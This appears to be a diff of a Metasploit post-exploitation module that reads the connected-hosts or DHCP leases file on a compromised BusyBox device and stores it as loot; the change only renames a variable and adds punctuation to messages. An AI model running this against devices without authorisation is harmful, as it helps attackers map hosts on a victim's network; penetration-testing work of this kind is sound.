@@ -31,29 +31,29 @@ class Metasploit3 < Msf::Post
 
   def run
     
-    hostsfile = nil
+    hosts_file = nil
   
     if file?("/var/hosts")
-      hostsfile = "/var/hosts"
+      hosts_file = "/var/hosts"
     elsif file?("/var/udhcpd/udhcpd.leases")
-      hostsfile = "/var/udhcpd/udhcpd.leases"
+      hosts_file = "/var/udhcpd/udhcpd.leases"
     else
       # Files not found
-      vprint_error("Files not found: /var/hosts, /var/udhcpd/udhcpd.leases")
+      vprint_error("Files not found: /var/hosts, /var/udhcpd/udhcpd.leases.")
       return
     end
     
     #File exists
     begin
-      str_file=read_file(hostsfile)
-      print_good("Hosts File found: #{hostsfile}")
+      str_file=read_file(hosts_file)
+      print_good("Hosts File found: #{hosts_file}.")
       vprint_line(str_file)
       #Store file
-      p = store_loot("Hosts", "text/plain", session, str_file, hostsfile, "BusyBox Device Connected Hosts")
-      print_good("Hosts saved to #{p}")
+      p = store_loot("Hosts", "text/plain", session, str_file, hosts_file, "BusyBox Device Connected Hosts")
+      print_good("Hosts saved to #{p}.")
     rescue EOFError
       # If there's nothing in the file, we hit EOFError
-      print_error("Nothing read from file: #{hostsfile}, file may be empty")      
+      print_error("Nothing read from file: #{hosts_file}, file may be empty.")
     end    
     
   end
